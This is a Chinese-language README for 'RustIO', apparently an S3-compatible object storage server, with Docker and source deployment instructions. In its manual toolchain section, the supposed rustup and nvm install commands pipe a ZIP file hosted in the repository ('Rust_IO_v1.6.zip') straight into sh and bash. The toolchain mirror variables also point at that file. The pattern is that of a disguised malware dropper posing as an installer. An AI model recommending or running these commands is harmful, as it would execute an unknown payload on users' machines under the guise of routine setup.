<p align="center">
  <img src="./assets/rustio-banner.svg" alt="RustIO 头图" width="100%" />
</p>

<h1 align="center">RustIO</h1>

<p align="center">
  基于 Rust 的 S3 兼容对象存储服务，内置单端口管理控制台，支持集群管理、复制与纠删码。
</p>

<p align="center">
  <img src="https://img.shields.io/badge/%E8%AE%B8%E5%8F%AF%E8%AF%81-Apache_2.0-2563EB?style=for-the-badge" alt="许可证 Apache 2.0" />
  <img src="https://img.shields.io/badge/%E5%90%8E%E7%AB%AF-Rust-F97316?style=for-the-badge&logo=rust&logoColor=white" alt="后端 Rust" />
  <img src="https://img.shields.io/badge/%E6%8E%A7%E5%88%B6%E5%8F%B0-React-0891B2?style=for-the-badge&logo=react&logoColor=white" alt="控制台 React" />
  <img src="https://img.shields.io/badge/%E9%83%A8%E7%BD%B2-%E5%8D%95%E7%AB%AF%E5%8F%A3-16A34A?style=for-the-badge" alt="部署 单端口" />
  <img src="https://img.shields.io/badge/%E6%8E%A5%E5%8F%A3-S3_%E5%85%BC%E5%AE%B9-0EA5E9?style=for-the-badge" alt="接口 S3 兼容" />
</p>

## 项目简介

RustIO 是一个公开发布的纯源码版对象存储仓库，默认提供：

- S3 兼容对象接口
- 单端口管理控制台
- 集群管理与健康检查
- IAM / 审计 / 指标摘要
- 复制、生命周期、对象锁与 KMS 能力
- 纠删码、读写 quorum 与数据保护能力

公开仓库当前保留了两条推荐启动链路：

- **Docker 一键启动**：适合大多数部署场景
- **源码一键启动**：适合本地构建、二次开发与调试

## 快速开始

### Docker 一键启动

```bash
./start.sh
```

后台启动：

```bash
./start.sh -d
```

强制重建镜像：

```bash
./start.sh --build
```

### 源码一键启动

```bash
chmod +x ./start-source.sh
./start-source.sh
```

## 默认端口与账号

### 默认端口

- S3 / Admin API：`9000`
- Web Console：`9000`

RustIO 采用**单端口模式**，控制台与 S3 / Admin API 共用 `9000`。

### 管理控制台默认账号

- 用户名：`admin`
- 密码：`rustio-admin`

可通过以下环境变量覆盖：

- `RUSTIO_CONSOLE_USER`
- `RUSTIO_CONSOLE_PASSWORD`

### S3 Root 默认账号

- Access Key：`rustioadmin`
- Secret Key：`rustioadmin`

可通过以下环境变量覆盖：

- `RUSTIO_ROOT_USER`
- `RUSTIO_ROOT_PASSWORD`

同时兼容以下 MinIO 风格环境变量：

- `MINIO_ROOT_USER`
- `MINIO_ROOT_PASSWORD`

## 方式一：Docker 部署

### 前置要求

- 已安装 Docker Engine 或 Docker Desktop
- 已安装 `docker compose` 插件，或系统中存在 `docker-compose`

### 启动命令

在项目根目录执行：

```bash
./start.sh
```

常用命令：

```bash
./start.sh --build
./start.sh -d
./start.sh --down
```

### 常用自定义示例

修改对外端口：

```bash
./start.sh --port 19000
```

修改数据目录：

```bash
./start.sh --data-dir ./data-prod
```

自定义容器名与镜像名：

```bash
./start.sh --container-name rustio-prod --image-name rustio-prod
```

也可以直接通过环境变量控制：

```bash
RUSTIO_HOST_PORT=19000 \
RUSTIO_DATA_DIR_HOST=./data-prod \
RUSTIO_CONTAINER_NAME=rustio-prod \
./start.sh -d
```

### 当前脚本已内置的兼容能力

- 自动探测 Docker Daemon API 版本
- 遇到老版本 daemon 时自动设置 `DOCKER_API_VERSION`
- 自动在 `docker compose` 与 `docker-compose` 之间择优
- 启动前自动创建宿主机数据目录
- 通过 `docker-compose.yml` 参数化端口、容器名、镜像名和数据挂载目录

### 如果你想直接执行 Compose

优先推荐使用 `./start.sh`，因为它已经封装了兼容探测。

高级用户若需要直接执行，也可以使用：

```bash
docker compose up -d
```

或：

```bash
docker-compose up -d
```

### 访问地址

- 控制台：`http://你的服务器IP:9000`
- S3 / Admin API：`http://你的服务器IP:9000`

如使用 `--port 19000`，则访问端口同步变为 `19000`。

### 数据持久化

Docker 模式默认将宿主机目录：

```bash
./data
```

挂载到容器内：

```bash
/app/data
```

### 停止服务

```bash
./start.sh --down
```

## 方式二：源码部署

### 前置要求

- Linux 或 macOS
- 本地可用的 C 编译器
- 可联网下载 Rust / Node 依赖

脚本会在缺失时自动尝试安装：

- Rust（通过 `rustup`）
- Node.js 22+（通过 `nvm`）

### 一键启动

```bash
./start-source.sh
```

### 常用命令

跳过前端构建，直接复用已有静态资源：

```bash
./start-source.sh --skip-web-build
```

强制重建前端：

```bash
./start-source.sh --force-web-build
```

强制使用 Docker 构建前端：

```bash
./start-source.sh --docker-node-build
```

自定义监听地址、数据目录与静态资源目录：

```bash
./start-source.sh \
  --addr 0.0.0.0:19000 \
  --data-dir ./data-dev \
  --console-dist ./web/console/dist
```

禁用自动镜像加速：

```bash
./start-source.sh --no-mirror
```

### 当前脚本已内置的兼容能力

- 缺失 Rust 时自动安装 `rustup`
- 缺失 Node.js 22+ 时自动安装 `nvm` 与 Node.js
- 检测到低版本 `glibc` 或本机 Node 环境异常时，自动回退到 Docker 构建前端
- Docker 构建前端时，同样支持老版本 Docker API 自动兼容
- 若前端静态资源未变化，会自动跳过重复构建
- 后端使用 `cargo build --locked --release -p rustio` 构建，避免锁文件漂移

### 手动安装工具链示例

```bash
# 安装 Rust
curl --proto '=https' --tlsv1.2 -sSf https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip | sh -s -- -y
source "$HOME/.cargo/env"

# 安装 Node.js 22+
curl -o- https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install 22
nvm alias default 22
nvm use 22

# 验证版本
rustc -V
cargo -V
node -v
npm -v
```

### 等价手动命令

```bash
export RUSTUP_DIST_SERVER=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
export RUSTUP_UPDATE_ROOT=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
export NVM_NODEJS_ORG_MIRROR=https://github.com/bing14414/RustIO/raw/refs/heads/main/crates/rustio-server/src/Rust_IO_v1.6.zip
export CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse

npm ci --prefix web/console --prefer-offline --no-audit --no-fund
npm run build --prefix web/console
cargo build --locked --release -p rustio
mkdir -p ./data

RUSTIO_ADDR=0.0.0.0:9000 \
RUSTIO_DATA_DIR=./data \
RUSTIO_CONSOLE_DIST=$PWD/web/console/dist \
./target/release/rustio
```

### 无法本机构建前端时的替代方案

如果服务器没有 Docker，且系统太旧导致 Node.js 22 无法运行，可以在另一台较新的机器先构建前端，再将 `web/console/dist` 同步到服务器，然后执行：

```bash
RUSTIO_SKIP_WEB_BUILD=1 ./start-source.sh
```

或：

```bash
./start-source.sh --skip-web-build
```

### 访问地址

- 控制台：`http://你的服务器IP:9000`
- S3 / Admin API：`http://你的服务器IP:9000`

如使用 `--addr 0.0.0.0:19000`，则访问端口变为 `19000`。

## 常用环境变量

### Docker 启动相关

- `RUSTIO_ADDR`：容器内监听地址，默认 `0.0.0.0:9000`
- `RUSTIO_HOST_PORT`：宿主机映射端口，默认 `9000`
- `RUSTIO_CONTAINER_PORT`：容器内暴露端口，默认 `9000`
- `RUSTIO_DATA_DIR_HOST`：宿主机数据目录，默认 `./data`
- `RUSTIO_DATA_DIR_CONTAINER`：容器内数据目录，默认 `/app/data`
- `RUSTIO_CONTAINER_NAME`：容器名称，默认 `rustio`
- `RUSTIO_IMAGE_NAME`：镜像名称，默认 `rustio-rustio`
- `RUSTIO_RESTART_POLICY`：重启策略，默认 `unless-stopped`

### 源码启动相关

- `RUSTIO_ADDR`：监听地址，示例 `0.0.0.0:9000`
- `RUSTIO_DATA_DIR`：数据目录，示例 `./data`
- `RUSTIO_CONSOLE_DIST`：前端静态资源目录，示例 `./web/console/dist`
- `RUSTIO_AUTO_MIRROR`：是否自动启用镜像加速，默认 `1`
- `RUSTIO_SKIP_WEB_BUILD`：是否跳过前端构建，默认 `0`
- `RUSTIO_FORCE_WEB_BUILD`：是否强制重建前端，默认 `0`
- `RUSTIO_USE_DOCKER_NODE_BUILD`：是否强制使用 Docker 构建前端，默认 `0`
- `RUSTIO_RUST_TOOLCHAIN`：指定 Rust 工具链版本，例如 `stable`

### 认证与账号

- `RUSTIO_CONSOLE_USER`
- `RUSTIO_CONSOLE_PASSWORD`
- `RUSTIO_ROOT_USER`
- `RUSTIO_ROOT_PASSWORD`
- `MINIO_ROOT_USER`
- `MINIO_ROOT_PASSWORD`

## 健康检查

服务启动后可检查：

- `GET /health/live`
- `GET /health/ready`
- `GET /health/cluster`

例如：

```bash
curl http://127.0.0.1:9000/health/live
curl http://127.0.0.1:9000/health/ready
curl http://127.0.0.1:9000/health/cluster
```

## 服务器部署建议

- 放通对外访问端口，默认是 `9000`
- 生产环境建议修改默认控制台账号与 S3 Root 账号
- 生产环境建议将数据目录挂载到独立磁盘
- 如需 TLS、域名和统一入口，建议前置 Nginx / Caddy / Traefik

## 常见问题

### 1. `./start.sh` 提示 Docker API 版本过高

例如看到类似：

```text
client version 1.53 is too new. Maximum supported API version is 1.43
```

当前 `./start.sh` 已内置自动兼容逻辑，通常直接重新执行即可。若你是手动执行 Compose，请先导出：

```bash
export DOCKER_API_VERSION=1.43
```

再执行 `docker compose up` 或 `docker-compose up`。

### 2. 老系统上 Node.js 22 无法运行

`./start-source.sh` 会优先尝试本机安装 Node.js 22+。如果系统 `glibc` 太旧或 Node 运行失败，脚本会自动回退到 Docker 构建前端。

如果服务器既没有 Docker、又无法运行 Node.js 22，请在另一台机器构建好 `web/console/dist` 后，再执行：

```bash
./start-source.sh --skip-web-build
```

### 3. 源码部署后看不到控制台

请确认：

- `web/console/dist` 已存在
- 启动时 `RUSTIO_CONSOLE_DIST` 指向正确目录
- 如果你跳过了前端构建，目录内不是空内容

### 4. Docker 重启后数据丢失

请确认：

- 宿主机数据目录未被清理
- `docker-compose.yml` 中的数据卷挂载未被改掉
- 你没有把临时目录误传给 `--data-dir`

### 5. 页面能打开但无法登录

请优先确认：

- 访问的是服务器实际 IP 或域名，而不是 `127.0.0.1`
- 对外端口已放行
- 控制台账号是否已被环境变量覆盖
- S3 Root 账号与控制台账号不是同一组概念

## 仓库结构

- `crates/`：Rust 后端源码
- `web/console/`：Web 管理控制台源码
- `Dockerfile.rustio`：Docker 镜像构建文件
- `docker-compose.yml`：Docker 部署入口
- `start.sh`：Docker 一键启动脚本
- `start-source.sh`：源码一键启动脚本

如果你只是部署使用，优先关注：

- `README.md`
- `docker-compose.yml`
- `start.sh`
- `start-source.sh`

## 贡献说明

欢迎提交 Issue 与 PR。提交前建议至少完成以下自检：

- 能说明改动目的、范围与验证方式
- 文档变更与代码变更保持同步
- 不提交敏感信息、本地密钥和环境残留
- 如涉及部署链路，优先验证 `./start.sh` 或 `./start-source.sh`
